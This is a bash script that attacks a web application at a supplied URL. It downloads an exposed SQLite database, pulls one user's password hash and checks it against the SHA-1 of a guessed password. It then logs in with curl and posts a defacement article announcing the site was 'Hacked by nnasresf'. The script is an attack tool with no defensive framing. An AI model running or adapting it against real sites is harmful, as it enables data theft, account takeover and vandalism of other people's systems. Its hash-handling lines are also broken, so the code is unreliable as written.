#!/bin/bash
url=$1;
USER=nnasresf
PASSWORD=123456

echo "Download data.db";
curl "$url/docs/data.db" -o data.db 2>/dev/null
echo -n "Getting password hash for user '${USER}'... "
HASH=$(sqlite3 data.db "select password from users where username='${USER}'") | awk '{print $1}'
echo "found hash."

rm -f data.db


HASH_KNOWN= echo -n ${PASSWORD} | sha1sum | awk '{print $1}'
echo ${HASH_KNOWN}
echo ${HASH}

if [ "${HASH}" != "${HASH_KNOWN}" ] ; then
    echo -e "\033[31mError: ERROR -  hash does not match rainbow table! :(!\033[0m"
else
    echo "hash matches rainbow table!"

	echo "Logging in as user '${USER}'..."

	curl -c cookies.txt -d "username=${USER}&password=${PASSWORD}&form=login&submit=Login" "$url/post.php";
    echo "Posting new article..."
	curl -b cookies.txt -d "title=Hello, I am Hacked by nnasresf! :)) &content=http://google.ca&type=2&form=content&submit=Post" "$url/post.php";
    echo -e "\033[32mDone!\033[0m"
    rm -f cookies.txt
fi

